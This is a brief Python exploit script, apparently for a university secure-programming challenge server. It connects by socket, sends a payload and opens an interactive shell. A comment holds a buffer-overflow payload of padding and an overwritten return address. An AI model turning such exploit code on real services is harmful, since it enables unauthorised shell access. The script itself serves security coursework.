import struct
from socket import *
import telnetlib

ip = 'secprog.cs.nctu.edu.tw'
port = 20001

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))

# payload = "a\n" . "\x00"."a"x71 . "\x0e\x86\x04\x08"
payload = "\n"
soc.send(payload)
# get interactive shell
t = telnetlib.Telnet()
t.sock = soc
t.interact()
